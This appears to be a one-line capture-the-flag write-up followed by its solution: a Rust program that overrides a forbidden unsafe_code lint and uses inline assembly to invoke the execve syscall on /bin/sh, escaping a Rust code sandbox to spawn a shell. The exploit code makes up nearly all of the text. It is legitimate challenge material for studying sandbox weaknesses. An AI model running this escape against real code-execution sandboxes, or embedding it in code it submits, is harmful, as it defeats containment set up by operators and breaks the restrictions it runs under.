- one line writeup: I do not understand why we can override `unsafe_code` option, from forbid to allow.

```rust
#![allow(unsafe_code)]
pub fn main() {
    let x = "/bin/sh\x00";
    let buf = x.as_bytes();
    let ret: isize;
    unsafe {
            asm!("syscall"
            : "={rax}"(ret)
             : "{rax}"(59), "{rsi}"(0), "{rdi}"(buf.as_ptr()), "{rdx}"(0)
             : "rcx","r11","memory"
             : "volatile");
    }

}
```
